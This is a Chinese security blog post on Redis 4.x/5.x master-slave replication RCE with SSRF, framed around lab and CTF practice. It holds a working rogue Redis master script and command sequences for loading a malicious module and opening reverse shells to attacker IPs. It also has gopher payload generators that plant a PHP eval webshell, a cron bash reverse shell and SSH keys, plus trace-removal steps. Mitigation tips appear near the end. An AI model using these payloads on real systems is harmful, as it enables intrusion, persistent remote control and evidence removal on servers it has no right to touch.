Redis主从复制RCE 这里搞着搞着就到了主从复制了，回想起之前搞这玩意儿弄得心烦，环境一直搞不好，看来是时候解决了~~ 介绍 redis 4.x/5.x RCE是由LC/BC战队队员Pavel Toporkov在zeronights 2018上提出的基于主从复制的redis rce，演讲的PPT地址为：PPT 利用条件 □ 能未授权或者能通过弱口令认证访问到Redis服务器 □ 可动态修改备份文件路径 □ 主从未校验可信服务端 主从复制概念 主从复制，是指将一台Redis服务器的数据，复制到其他的Redis服务器。前者称为主节点(master)，后者称为从节点(slave)；数据的复制是单向的，只能由主节点到从节点。 redis的持久化使得机器即使重启数据也不会丢失，因为redis服务器重启后会把硬盘上的文件重新恢复到内存中，但是如果硬盘的数据被删除的话数据就无法恢复了，如果通过主从复制就能解决这个问题，主redis的数据和从redis上的数据保持实时同步，当主redis写入数据时就会通过主从复制复制到其它从redis。 这里就跟着师傅搭建主从复制了，属实是不懂唉 建立主从复制，有3种方式： 配置文件写入slaveof &lt;master_ip&gt; &lt;master_port&gt; redis-server启动命令后加入 --slaveof &lt;master_ip&gt; &lt;master_port&gt; 连接到客户端之后执行：slaveof &lt;master_ip&gt; &lt;master_port&gt; PS：建立主从关系只需要在从节点操作就行了，主节点不用任何操作 我们先在同一个机器开两个redis实例，一个端口为6379，一个端口为6380 这里我们在上面搭建的基础上，同一目录下新建redis6380文件，接着将之前已经有的redis目录下的redis.conf配置文件赋值到redis6380文件中，接着修改其中端口为6380即可 可参考：Centos7搭建多个Redis实例 redis-server /etc/redis/redis.conf redis-server /etc/redis/redis6380.conf #这里需要在redis-server服务所在目录下启动，而后面的内容为redis配置文件路径 可以看到均启动成功 我们把master_ip设置为127.0.0.1，master_port为6380 --这里这个师傅是将6380所在redis服务器当做主服务器了 可以看到在成功设置主从关系之后，我们在6380主服务器上设置某些数据，之后在6379上可以看到数据的同步 如果我们想解除主从关系可以执行SLAVEOF NO ONE redis module 自从Redis4.x之后redis新增了一个模块功能，Redis模块可以使用外部模块扩展Redis功能，以一定的速度实现新的Redis命令，并具有类似于核心内部可以完成的功能。 Redis模块是动态库，可以在启动时或使用MODULE LOAD命令加载到Redis中。 恶意so文件编写：https://github.com/n0b0dyCN/redis-rogue-server/tree/master/RedisModulesSDK 攻击原理 利用步骤，贴一下PPT上的步骤 slave和master的握手协议过程 图中一些常量说明 #define REPL_STATE_CONNECTING 2 /* 等待和master连接 */ /* --- 握手状态开始 --- */ #define REPL_STATE_RECEIVE_PONG 3 /* 等待PING返回 */ #define REPL_STATE_SEND_AUTH 4 /* 发送认证消息 */ #define REPL_STATE_RECEIVE_AUTH 5 /* 等待认证回复 */ #define REPL_STATE_SEND_PORT 6 /* 发送REPLCONF信息，主要是当前实例监听端口 */ #define REPL_STATE_RECEIVE_PORT 7 /* 等待REPLCONF返回 */ #define REPL_STATE_SEND_CAPA 8 /* 发送REPLCONF capa */ #define REPL_STATE_RECEIVE_CAPA 9 /* 等待REPLCONF返回 */ #define REPL_STATE_SEND_PSYNC 10 /* 发送PSYNC */ #define REPL_STATE_RECEIVE_PSYNC 11 /* 等待PSYNC返回 */ /* --- 握手状态结束 --- */ #define REPL_STATE_TRANSFER 12 /* 正在从master接收RDB文件 */ 这里的重点就是利用全量复制将master上的RDB文件同步到slave上，也就是将我们的恶意so文件传输到slave上，从而达到加载恶意so文件达到rce。 那为什么一定是全量复制呢，理由如下，当slave向master发送PSYNC命令之后，一般会得到三种回复： +FULLRESYNC：进行全量复制。 +CONTINUE：进行增量同步。 -ERR：当前master还不支持PSYNC。 全量复制的过程 slave向master发送PSYNC请求，并携带master的runid和offest，如果是第一次连接的话slave不知道master的runid，所以会返回runid为?，offest为-1，我们来测试以下看看是不是真的如此 这里我们先对6379的redis输入slave no one，解除他与6380redis之间的主从关系，接着kali开启监听，在6379上设置kali为redis的主服务器 这里我操作失误了，连接第二次我才搞懂得干嘛。。。似乎就是redis连接你之后，你需要回复指定命令与其进行通信，最后返回master的runid和offest，即： 主服务器需要执行的响应内容如下: [&gt;] PING – 从服务器探测主服务器是否存活 [&lt;] +PONG 存活响应 [&gt;] REPLCONF – 交换主从节点复制信息 [&lt;] +OK 确认 [&gt;] PSYNC/SYNC – 同步状态以及传输方式 [&lt;] +FULLRESYNC 同步数据 正确的应该是这样 过程是这样的： master验证slave发来的runid是否和自身runid一致，如不一致，则进行全量复制。 master把自己的runid和offset发给slave，slave对master发来的runid和offest进行保存 master进行bgsave，生成RDB文件 master将写好的RDB文件传输给slave，并将缓冲区内的数据传输给slave slave加载RDB文件和缓冲区数据 增量复制（部分复制） 增量复制的过程这里简单带过一下：就是当slave向master要求数据同步时，会发送master的runid和offest，如果runid和slave上的不对应则会进行全量复制，如果相同则进行数据同步，但是不会传输RDB文件 通过了解全量复制和增量复制的过程，我们应该大致知道为什么一定要用全量复制而不用增量复制了。 但是这样我感觉还是欠点什么，因为我认为我没有完全搞懂，又找了几篇文章发现这个解释的很好： Redis提供了2种不同的持久化方式，RDB方式（在指定的时间间隔内生成数据集的时间点快照）和AOF方式（记录服务器执行的所有写操作命令）.AOF方式备份数据库的文件名默认为appendonly.aof，可以在配置文件中通过修改appendfilename参数进行修改，无法在客户端交互中动态设置appendfilename，而RDB方式备份数据库的文件名默认为dump.rdb，此文件名可以通过客户端交互动态设置dbfilename来更改。 这也说明了我们为何要选择RDB方式了。 上图可以看到我们可以任意设置RDB文件名，但对于AOF却不行，而重点如下： 主从复制模式下数据单向从主节点流向从节点，在从节点首次注册时，会对主节点数据进行全量复制，复制过程中用offset记录读取的数据大小，以便中断后断点续传。如果从节点初始没有数据，通过主从复制，可以将主节点设置的dbfilename文件全量复制到从节点的dbfilename中，从而实现任意文件上传。 这也就说明了，攻击的时候似乎只能一次成功吗？毕竟如果第二次连接就不是首次注册了。。。 不过原理算是彻底明白了 攻击流程 第一个就是先配置一个攻击服务器，这个服务器是用于被受害者redis服务器连接的，也就是我们的靶机为从服务器，攻击机为主服务器（而恶意so文件就在我们的攻击机上） 而攻击机在于redis交互的过程中，需要发送如下信息： PING 测试连接是否可用 +PONG 告诉slave连接可用 REPLCONF 发送REPLCONF信息，主要是当前实例监听端口 +OK 告诉slave成功接受 REPLCONF 发送REPLCONF capa +OK 告诉slave成功接受 PSYNC &lt;rundi&gt; &lt;offest&gt; 发送PSYNC 这里样的话才算成功的冒充为了一名合格的redis主服务器 如下图所示：这里我就借用了~~ 而此时的redis从服务器需要主动的发送如下信息（实际就是我们操控它发送） Config set dir ./ 设置redis的备份路径为当前目录 Config set dbfilename test.so 修改备份文件名 SLAVEOF host port 设置为对应服务器的从节点 MODULE LOAD ./test.so 加载复制过来的 SLAVEOF no one 关闭主从复制关系(防止脏数据复制) System.exec ‘command’ 执行命令 任意文件写入 这里呢，我是先配置的redis服务对外开放6379端口，ssrf后续再说，这里开启之后呢，我并没有对redis设置登录密码，但同时要设置取消保护模式，同时对于监听本地127.0.0.1的那一行需要注释掉 接下来我们kali连接测试一下，如下图可以看到能成功连接 这里的话先连接上redis-server，之后设置备份文件目录，以及备份文件名，然后执行slaveof使其成为我们恶意服务的从redis，恶意 master 在接收到 redis-server 的 PSYNC 命令后，返回 FULLRESYNC 命令，并将 payload 紧跟着发送。最终 payload 被写到 redis-server 的 /var/www/html/exp.txt 当中 恶意master如下 import os import sys import argparse import socketserver import logging import socket import time logging.basicConfig(stream=sys.stdout, level=logging.INFO, format='&gt;&gt; %(message)s') DELIMITER = b\"\\r \" class RoguoHandler(socketserver.BaseRequestHandler): def decode(self, data): if data.startswith(b'*'): return data.strip().split(DELIMITER)[2::2] if data.startswith(b'$'): return data.split(DELIMITER, 2)[1] return data.strip().split() def handle(self): while True: data = self.request.recv(1024) print(data) logging.info(\"receive data: %r\", data) arr = self.decode(data) if arr[0].startswith(b'PING'): self.request.sendall(b'+PONG' + DELIMITER) elif arr[0].startswith(b'REPLCONF'): self.request.sendall(b'+OK' + DELIMITER) elif arr[0].startswith(b'PSYNC') or arr[0].startswith(b'SYNC'): self.request.sendall(b'+FULLRESYNC ' + b'Z' * 40 + b' 1' + DELIMITER) self.request.sendall(b'$' + str(len(self.server.payload)).encode() + DELIMITER) self.request.sendall(self.server.payload + DELIMITER) break self.finish() def finish(self): self.request.close() class RoguoServer(socketserver.TCPServer): allow_reuse_address = True def __init__(self, server_address, payload): super(RoguoServer, self).__init__(server_address, RoguoHandler, True) self.payload = payload if __name__=='__main__': expfile = '/home/hybcx/flag.txt' #我们要传输的恶意文件的路径 lport = 6666 with open(expfile, 'rb') as f: server = RoguoServer(('0.0.0.0', lport), f.read()) print(\"[+] listening ......\") server.handle_request() print(\"[+] completed ~~~\") 之后现在kali上执行如下命令： 配置好之后，我们开启恶意master 当其运行结束后，我们在靶机上即可查看到flag.txt被写入。这里肯定想着为何kali上执行个py就写入了呢，因为在此之前我们已经将我们的恶意master设置为了主redis，那我们在其中的任何操作，都可以同步到从redis，也就是我们的靶机，我们这里的py逻辑就是与从服务器命令交互完，直接发送payload，造成文件上传 实际上细细研究发现这里似乎存在一个时间问题，比如我早就在从redis上配置好了我主redis的ip即端口，但此时主redis还没开启，是休眠状态，但一当我开启主redis，从redis就会向主redis发送PING命令，等待具体的回复，究竟是要进行全量复制，还是增量复制等等等等。而我们上述的恶意master会在从redis发送给我们PING命令之后给予相关的回应，最后发送给从redis进行全量复制的命令，最终导致我们的恶意文件上传效果。 redis加载恶意.so 这里思路大致与上述一直，这里我们改一下配置即可（注意这里依旧是利用redis未授权） #设置redis的备份路径为当前目录 config set dir ./ #设置备份文件名为exp.so，默认为dump.rdb config set dbfilename exp.so #设置主服务器IP和端口 slaveof 192.168.172.129 1234 #加载恶意模块 module load ./exp.so #执行系统命令 system.exec 'whoami' system.rev 127.0.0.1 9999 如图所示，配置好后我们开启恶意master，但这里不知道为何设置备份目录为当前的时候不成功。。。就先设置tmp了 import os import sys import argparse import socketserver import logging import socket import time logging.basicConfig(stream=sys.stdout, level=logging.INFO, format='&gt;&gt; %(message)s') DELIMITER = b\"\\r \" class RoguoHandler(socketserver.BaseRequestHandler): def decode(self, data): if data.startswith(b'*'): return data.strip().split(DELIMITER)[2::2] if data.startswith(b'$'): return data.split(DELIMITER, 2)[1] return data.strip().split() def handle(self): while True: data = self.request.recv(1024) print(data) logging.info(\"receive data: %r\", data) arr = self.decode(data) if arr[0].startswith(b'PING'): self.request.sendall(b'+PONG' + DELIMITER) elif arr[0].startswith(b'REPLCONF'): self.request.sendall(b'+OK' + DELIMITER) elif arr[0].startswith(b'PSYNC') or arr[0].startswith(b'SYNC'): self.request.sendall(b'+FULLRESYNC ' + b'Z' * 40 + b' 1' + DELIMITER) self.request.sendall(b'$' + str(len(self.server.payload)).encode() + DELIMITER) self.request.sendall(self.server.payload + DELIMITER) break self.finish() def finish(self): self.request.close() class RoguoServer(socketserver.TCPServer): allow_reuse_address = True def __init__(self, server_address, payload): super(RoguoServer, self).__init__(server_address, RoguoHandler, True) self.payload = payload if __name__=='__main__': expfile = '/home/hybcx/Tools/redis-rogue-getshell/exp.so' #我们要传输的恶意文件的路径 lport = 6666 with open(expfile, 'rb') as f: server = RoguoServer(('0.0.0.0', lport), f.read()) print(\"[+] listening ......\") server.handle_request() print(\"[+] completed ~~~\") 记得修改恶意文件路径吗，如下图运行之后执行system命令成功 SSRF进行redis加载.so 这里虽然进行了上述的实操，但感觉不够真实，毕竟感觉现实中存在ssrf的概率才是大的，虽然可以爆破弱口令，但总感觉少点什么。而且这里的ssrf攻击的过程一直没搞成功，现在再来搞一下。 这里我们先取消redis的主从关系，并且重新配置文件，开启目标redis的保护模式，以及只让其监听本地127.0.0.1。 之后重启redis服务 确定一下对方服务的配置，现在我们进行构造恶意命令 #第一次攻击 config set dir /tmp config set dbfilename exp.so slaveof 192.168.246.130 6666 #第二次攻击 module load /tmp/exp.so system.exec \"id\" 在这里分两次是因为第一次我们在传入命令之后，exp.so还未被加载，之后第二次才输入的加载指令，当然你也可以合并上述两个payload，然后发送两次。 gopher://127.0.0.1:6379/_config%2520set%2520dir%2520/tmp%250D%250Aconfig%2520set%2520dbfilename%2520exp.so%250D%250Aslaveof%2520192.168.246.130%25206666%250D%250Amodule%2520load%2520/tmp/exp.so%250D%250Asystem.exec%2520%2522id%2522%250D%250A 这里进行了两次编码，但是在我发送两次之后页面并没有回显，不知道是否是配置问题，但在靶机上测试如下，发现是成功加载的 这让我突然迷惑了，是否我太过钻牛角尖了，本来如果这里存在ssrf的话，我们本就可以进行写入公钥，写webshell等等，这样的话我们完全就可以连接上对方redis服务，这样的话就没必要非得利用ssrf来rce了。这里的疑惑还是通过一会儿的做题来感受吧。。。 痕迹清除 为了减少对服务器的影响，攻击完成后，应该尽量清除痕迹，需要恢复目录和数据库文件，卸载同时删除模块，而数据原本的配置信息，需要在攻击之前进行备份。 CONFIG get * # 获取所有的配置 CONFIG get dir # 获取 快照文件 保存的 位置 CONFIG get dbfilename # 获取 快照文件 的文件名 #切断主从，关闭复制功能 slaveof no one #恢复目录 config set dir /data #通过dump.rdb文件恢复数据 config set dbfilename dump.rdb #删除exp.so system.exec 'rm ./exp.so' #卸载system模块的加载 module unload system 漏洞利用的版本是redis 4.x/5.x ，如果是先前版本的Redis，则无法加载模块，自然也就无法利用。在网上开了几个开源的利用脚本，都没有进行版本的判断，如果直接使用exp，除了攻击失败外，可能会修改了 dir 和dbfilename ，这些都可以通过redis未授权修改回原来的配置（前提是有提前备份），而目录下会多生成一个 exp.so文件。 0x06 题目实战 CTFHUB-SSRF-redis协议 看到url，那开始测试 发现存在6379的redis服务，那我们看看是否对方redis设置了密码，脚本跑一下，如下图，发现没有设置 那这里我想的就是先尝试写webshell，话不多说直接上脚本 import urllib protocol=\"gopher://\" ip=\"127.0.0.1\" port=\"6379\" shell=\" &lt;?php eval($_GET[\\\"cmd\\\"]);?&gt; \" filename=\"shell.php\" path=\"/var/www/html\" passwd=\"\" cmd=[\"flushall\", \"set 1 {}\".format(shell.replace(\" \",\"${IFS}\")), \"config set dir {}\".format(path), \"config set dbfilename {}\".format(filename), \"save\" ] if passwd: cmd.insert(0,\"AUTH {}\".format(passwd)) payload=protocol+ip+\":\"+port+\"/_\" def redis_format(arr): CRLF=\"\\r \" redis_arr = arr.split(\" \") cmd=\"\" cmd+=\"*\"+str(len(redis_arr)) for x in redis_arr: cmd+=CRLF+\"$\"+str(len((x.replace(\"${IFS}\",\" \"))))+CRLF+x.replace(\"${IFS}\",\" \") cmd+=CRLF return cmd if __name__==\"__main__\": for x in cmd: payload += urllib.quote(redis_format(x)) print urllib.quote(payload) py2运行，这里需要两次url编码 gopher%3A//127.0.0.1%3A6379/_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252431%250D%250A%250A%250A%253C%253Fphp%2520eval%2528%2524_GET%255B%2522cmd%2522%25 5D%2529%253B%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A/var/www/html%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A 直接url上传，之后访问shell.php 成功上传并拿到flag Redis 4.x/5.x主从复制RCE 复现地址：https://vulhub.org/#/environments/redis/4-unacc/ 直接vulhub一键启动靶机，之后kali尝试连接目标redis，如下图，存在未授权访问 直接上exp，这里使用了两种，但感觉第一种更好一点 python3 redis-rogue-server.py --rhost 192.168.246.137 --rport 6379 --lhost 192.168.246.130 6666 可以看到直接就拿到shell了 第二个：https://github.com/vulhub/redis-rogue-getshell python3 redis-master.py -r 192.168.246.137 -p 6379 -L 192.168.246.130 -P 6666 -f RedisModulesSDK/exp.so -c \"id\" [网鼎杯 2020 玄武组]SSRFMe 这里推荐去nssctf平台复现，buu似乎有问题 &lt;?php function check_inner_ip($url) { $match_result=preg_match('/^(http|https|gopher|dict)?:\\/\\/.*(\\/)?.*$/',$url); if (!$match_result) { die('url fomat error'); } try { $url_parse=parse_url($url); } catch(Exception $e) { die('url fomat error'); return false; } $hostname=$url_parse['host']; $ip=gethostbyname($hostname); $int_ip=ip2long($ip); return ip2long('127.0.0.0')&gt;&gt;24 == $int_ip&gt;&gt;24 || ip2long('10.0.0.0')&gt;&gt;24 == $int_ip&gt;&gt;24 || ip2long('172.16.0.0')&gt;&gt;20 == $int_ip&gt;&gt;20 || ip2long('192.168.0.0')&gt;&gt;16 == $int_ip&gt;&gt;16; } function safe_request_url($url) { if (check_inner_ip($url)) { echo $url.' is inner ip'; } else { $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); curl_setopt($ch, CURLOPT_HEADER, 0); $output = curl_exec($ch); $result_info = curl_getinfo($ch); if ($result_info['redirect_url']) { safe_request_url($result_info['redirect_url']); } curl_close($ch); var_dump($output); } } if(isset($_GET['url'])){ $url = $_GET['url']; if(!empty($url)){ safe_request_url($url); } } else{ highlight_file(__FILE__); } // Please visit hint.php locally. ?&gt; 这里的重点就是针对url的检查，其中的对于用到的协议他规定只能是http、https、gopher与dict，但我们重点需要绕过的是这个： return ip2long('127.0.0.0')&gt;&gt;24 == $int_ip&gt;&gt;24 || ip2long('10.0.0.0')&gt;&gt;24 == $int_ip&gt;&gt;24 || ip2long('172.16.0.0')&gt;&gt;20 == $int_ip&gt;&gt;20 || ip2long('192.168.0.0')&gt;&gt;16 == $int_ip&gt;&gt;16; } 这里是将一个标准ip地址转换为二进制形式的长字符串，然后与这里规定的127.0.0.1、10.0.0.0、172.16.0.0、192.168.0.0进行比较，如果有一个为真，则证明标志的ssrf的攻击 // 初始的8的二进制表示，右边有两位空出： 0000 0000 0000 0000 0000 0000 0000 1000 // 执行右移两位后： 0000 0000 0000 0000 0000 0000 0000 0010 这里绕过似乎也挺简单的，就是0.0.0.0即可，然后根据题目提示让我们查看hint.php ?url=http://0.0.0.0/hint.php &lt;?php if($_SERVER['REMOTE_ADDR']===\"127.0.0.1\"){ highlight_file(__FILE__); } if(isset($_POST['file'])){ file_put_contents($_POST['file'],\"&lt;?php echo 'redispass is root';exit();\".$_POST['file']); } 随后就是通过file_put_contents函数处理post传参，并且代码中提示我们redis的密码是root，这也提示我们这道题考察的就是如何通过ssrf攻击redis 这里验证也说明6379的存在，接下来先尝试向其中加载恶意.so，不过需要注意密码的验证，payload如下： auth root #用户认证 config set dir /tmp/ #设置备份目录 config set dbfilename exp.so #设置备份文件名 slaveof vpsip vpsport\t#设置主从关系，这里的主redis设置为我们的恶意vps module load /tmp/exp.so\t#从我们的恶意主redis上加载恶意exp.so system.rev vpsip vpsport\t#执行system命令，进行反弹shell 但这道题用到的是ssrf，所以上脚本 from urllib.parse import quote import requests payload = \"\"\"auth root config set dir /tmp config set dbfilename exp.so slaveof vps port module load /tmp/exp.so system.rev vpsip vpsport \"\"\" inner_url = f\"gopher://0.0.0.0:6379/_{quote(quote(payload))}\" print(inner_url) #url = \"http://e90ce983-16dd-4dff-8850-58a09b264a47.node4.buuoj.cn:81/?url=\" + inner_url #resp = requests.get(url) #print(resp.text) 发送之前，我们先准备好恶意master，且必须是公网的vps，这里推荐项目： https://github.com/Testzero-wz/Awsome-Redis-Rogue-Server/blob/master/redis_rogue_server.py 上面这个用于需要授权的redis攻击使用 https://github.com/n0b0dyCN/redis-rogue-server --这个用于目标redis是未授权的时候使用 这里我们输入如下命令，这里需要将恶意exp.so文件放入redis-rogue-server.py同目录下 python3 redis_rogue_server.py -path exp.so -lhost vps -lport 5555 #指定exp.so文件路径 -lhost为我们的vpsip lport设置为vps要监听的端口 这里实际上我们是等待被动连接，这里开启了上述服务后，我们构造命令发送 from urllib.parse import quote import requests # auth root # config set dir /tmp # config set dbfilename exp.so # slaveof vps 5555 # module load /tmp/exp.so # system.rev vps 8888 payload = \"\"\"auth root module load /tmp/exp.so system.rev vps 8888 quit \"\"\" inner_url = f\"gopher://0.0.0.0:6379/_{quote(quote(payload))}\" print(inner_url) 这里我是分了两批payload发送，一起发送也是可以的，不过就得发送两次了，这里将得到的payload发送到ssrf漏洞点，接着就会发现我们的恶意服务收到了连接请求，但要注意在vps上开启接受反弹shell的端口。 最后就会发现我们成功拿到shell，这里不知为何截图都没了，懒得在搞了。 吐槽一手：buu题目环境害人啊，我一直不成功，还以为是我思路有问题，一直想不出来。。。。 Weblogic SSRF漏洞 简介 WebLogic是美国Oracle公司出品的一个application server确切的说是一个基于JAVAEE架构的中间件，BEA WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。 Weblogic中存在一个SSRF漏洞，利用该漏洞可以发送任意HTTP请求，进而攻击内网中redis、fastcgi等脆弱组件。 影响范围： weblogic 版本10.0.2 weblogic 版本10.3.6 漏洞复现 复现环境：https://vulhub.org/#/environments/weblogic/ssrf/ 如上图代表成功启动，这里我们直接bp抓个包，这里我先用dirsearch扫个目录 可以发现还是有很多的，这里测试一番发现uddi这个目录很可疑 如上图，这里似乎是个未授权访问，点击第一个连接的search抓包发现，如下图存在一个url链接 这里修改个参数值为127.0.0.1，如下图发现其好像在尝试连接这个地址，我们探测一下端口存活情况 bp爆破端口之后发现下图，这里并没有探测到什么重点端口，这里我就不会了，看了wp发现，比我想的更复杂，这里需要探测内网。。而我只是单纯探测个端口而已 这里顺便补充一个资料：2016乌云大会上猪猪侠师傅介绍的《WebLogic SSRF 服务探测》 接下来就进行内网ip的探测，不过这里需要注意的是我们是用docker搭建的，因此探测的时候应该使用docker的ip段来探测 我们开始设置爆破格式，自定义迭代器的payload类型 这里在1中输入172，然后下方添加.分隔符 位置2填入17与分隔符. 这里搞错了，对我的靶机来说是该填入19的 位置三设置0-255与分隔符. 然后位置4设置0-255，但不需要设置分隔符 开始爆破，结果如下图所示，这里的爆破就说明我们的ip是存在的，但是对应的端口不存在，那我们直接探测该ip的端口存活情况即可 设置好开始爆破，如下图所示，这里的报错说明我们的端口是存活的 Weblogic的SSRF有一个比较大的特点，就是我们可以通过传入%0a%0d来注入换行符，而某些服务（如redis）是通过换行符来分隔每条命令，也就说我们可以通过该SSRF攻击内网中的redis服务器。 那接下来我们尝试写入定时任务反弹shell #!/usr/local/bin python # coding=utf8 try: from urllib import quote except: from urllib.parse import quote def generate_info(passwd): cmd = [ \"info\", \"quit\" ] if passwd: cmd.insert(0, \"AUTH {}\".format(passwd)) return cmd def generate_shell(filename, path, passwd, payload): cmd = [\"flushall\", \"set 1 {}\".format(payload), \"config set dir {}\".format(path), \"config set dbfilename {}\".format(filename), \"save\", \"quit\" ] if passwd: cmd.insert(0, \"AUTH {}\".format(passwd)) return cmd def generate_reverse(filename, path, passwd, payload): # centos cmd = [\"flushall\", \"set 1 {}\".format(payload), \"config set dir {}\".format(path), \"config set dbfilename {}\".format(filename), \"save\", \"quit\" ] if passwd: cmd.insert(0, \"AUTH {}\".format(passwd)) return cmd def generate_sshkey(filename, path, passwd, payload): cmd = [\"flushall\", \"set 1 {}\".format(payload), \"config set dir {}\".format(path), \"config set dbfilename {}\".format(filename), \"save\", \"quit\" ] if passwd: cmd.insert(0, \"AUTH {}\".format(passwd)) return cmd def generate_rce(lhost, lport, passwd, command=\"cat /etc/passwd\"): exp_filename = \"exp.so\" cmd = [ \"SLAVEOF {} {}\".format(lhost, lport), \"CONFIG SET dir /tmp/\", \"config set dbfilename {}\".format(exp_filename), \"MODULE LOAD /tmp/{}\".format(exp_filename), \"system.exec {}\".format(command.replace(\" \", \"${IFS}\")), # \"SLAVEOF NO ONE\", # \"CONFIG SET dbfilename dump.rdb\", # \"system.exec rm${IFS}/tmp/{}\".format(exp_filename), # \"MODULE UNLOAD system\", \"quit\" ] if passwd: cmd.insert(0, \"AUTH {}\".format(passwd)) return cmd def rce_cleanup(): exp_filename = \"exp.so\" cmd = [ \"SLAVEOF NO ONE\", \"CONFIG SET dbfilename dump.rdb\", \"system.exec rm /tmp/{}\".format(exp_filename).replace(\" \", \"${IFS}\"), \"MODULE UNLOAD system\", \"quit\" ] if passwd: cmd.insert(0, \"AUTH {}\".format(passwd)) return cmd def redis_format(arr): CRLF = \"\\r \" redis_arr = arr.split(\" \") cmd = \"\" cmd += \"*\" + str(len(redis_arr)) for x in redis_arr: cmd += CRLF + \"$\" + str(len((x))) + CRLF + x cmd += CRLF return cmd def generate_payload(passwd, mode): payload = \"test\" if mode == 0: filename = \"shell.php\" path = \"/var/www/html\" shell = \" &lt;?=eval($_GET[0]);?&gt; \" cmd = generate_shell(filename, path, passwd, shell) elif mode == 1: filename = \"root\" path = \"/var/spool/cron/\" shell = \" */1 * * * * bash -i &gt;&amp; /dev/tcp/192.168.246.130/5555 0&gt;&amp;1 \" cmd = generate_reverse(filename, path, passwd, shell.replace(\" \", \"^\")) elif mode == 2: filename = \"authorized_keys\" path = \"/root/.ssh/\" pubkey = \" ssh-rsa \" cmd = generate_sshkey(filename, path, passwd, pubkey.replace(\" \", \"^\")) elif mode == 3: lhost = \"124.220.233.26\" lport = \"5555\" command = \"ls /\" cmd = generate_rce(lhost, lport, passwd, command) elif mode == 31: cmd = rce_cleanup() elif mode == 4: cmd = generate_info(passwd) protocol = \"gopher://\" ip = \"0.0.0.0\" port = \"6379\" payload = protocol + ip + \":\" + port + \"/_\" for x in cmd: payload += quote(quote(redis_format(x).replace(\"^\", \" \"))) return payload if __name__ == \"__main__\": # 0 for webshell ; 1 for re shell ; 2 for ssh key ; # 3 for redis rce ; 31 for rce clean up # 4 for info # suggest cleaning up when mode 3 used mode = 1 # input auth passwd or leave blank for no pw passwd = '' p = generate_payload(passwd, mode) print(p) 选择模式1，这里只需要一次编码即可 aaa%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2461%0D%0A%0A%0A%2A/1%20%2A%20%2A%20%2A%20%2A%20bash%20-i%20%3E%26%20/dev/tcp/192.168.246.130/5555%200%3E%261%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2416%0D%0A/var/spool/cron/%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%244%0D%0Aroot%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%2A1%0D%0A%244%0D%0Aquit%0D%0Aaaa 如上图成功反弹shell，这里有点懵逼的是，我看那些师傅都在payload前后加个aaa的无用字符，不知道为何，我这里删除之后测试，依旧可以反弹shell。。。搜了多个文章也无果，希望日后可以解惑吧 docker exec -it 4cfd33d77a1c ip addr 这里我们可以通过上述命令来得知docker容器的ip地址。 0x07 修复建议 ① Redis设置访问白名单(入 防止恶意访问和出 防止恶意设置为主从) ② Redis添加认证 在配置文件/etc/redis/redis.conf中修改requirepasss属性为强口令，完成后重启服务器 动态命令设置config set requirepass YorPass ③ 重命名相关命令 在配置文件/etc/redis/redis.conf中 rename-command CONFIG PDZA1DA也可以rename-command CONFIG \"\" 设置为空来禁用 对于恶意特征，可以通过MODULE LIST命令查看当前加载的模块信息，重点关注非官方加载或者SYSTEM、EXEC等恶意关键词，监控Redis服务器上Redis进程写入的so文件（Windows为DLL文件），流量中可以重点关注FULLRESYNC命令以及相关文件二进制特征（Webshell，Cron，Authorized_keys，so和DLL等）。 0x08 知识总结 Dict协议使用注意事项 Dict协议中可以用:代替空格 ?会截断后面的内容(写马的情况下要想办法bypass “?”) dict协议一次只能发送一条数据 crontab写入Tips /etc/crontab /etc/cron.d/*：将任意文件写到该目录下，效果和crontab相同，格式也要一致，并且在该目录操作可以做到不覆盖任何其他文件的情况进行弹shell； /var/spool/cron/root：CentOS系统下root用户的cron文件； /var/spool/cron/crontabs/root：Debian系统下root用户的cron文件； 0x09 参考文章 redis 主从复制 RCE 浅析Redis中SSRF的利用 Redis主从复制RCE影响分析 服务端请求伪造（SSRF）之Redis篇 SSRF+Redis 利用SSRF攻击内网Redis服务 服务端请求伪造（SSRF）之Redis篇 Redis主从复制RCE分析 很经典的一道CTF-WriteUP[网鼎杯 2020 玄武组]SSRFMe 利用WebLogic SSRF漏洞攻击内网Redis反弹shell SSRF中Redis的利用 WebLogic SSRF（CVE-2014-4210） SSRF——weblogic vulhub 漏洞复现及攻击内网redis（一）（附批量检测脚本）","tags":["基础知识"],"categories":["web知识总结"]},{"title":"open_basedir+wake_up绕过总结","path":"/2023/12/25/open-basedir-wakeup-rao-guo/","content":"0x01 open_basedir绕过 配置介绍 open_basedir是php.ini中的一个配置选项，可用于将用户访问文件的活动范围限制在指定的区域。在php.ini中设置open_basedir的值/var/www/html 设置open_basedir=/var/www/html/,通过web访问服务器的用户就无法获取服务器上除了/var/www/html/这个目录以外的文件。 假设这时连接一个webshell，当webshell工具尝试遍历和读取其他目录时将会失败。也就是蚁剑无法成功读写其他目录下的文件 系统命令函数绕过 如果此时的靶机只有open_basedir的限制，disable_functions并未过多限制，那我们可以通过system尝试，在这里就借用师傅们的图片了~~~ 能够遍历上上级目录,而在webshell工具中时被禁止的,说明确实能够绕过，实际情况中,可能system()函数由于disable_function禁用无法使用，可通过同类执行命令函数绕过。但如果几乎过滤了所有的命令函数，那就需要以下几种方法了。 利用glob://协议绕过 glob://伪协议 glob://是查找匹配的文件路径模式,glob数据流包装器自 PHP 5.3.0 起开始有效，下面是官方的一个domo &lt;?php // 循环 ext/spl/examples/ 目录里所有 *.php 文件 // 并打印文件名和文件尺寸 $it = new 